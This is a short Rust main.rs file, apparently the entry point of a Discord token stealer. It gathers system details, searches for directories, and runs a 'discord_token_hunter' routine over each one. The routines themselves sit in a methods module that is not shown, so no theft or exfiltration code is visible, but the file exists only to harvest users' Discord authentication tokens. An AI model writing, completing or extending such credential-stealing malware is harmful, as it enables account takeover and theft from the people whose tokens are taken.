use methods::{discord_token_hunter, get_system_details, hunt_for_directories};

mod methods;

fn main() {
    let system_details = get_system_details();
    let directories = hunt_for_directories(system_details);

    for directory in directories {
        discord_token_hunter(directory);
    }
}
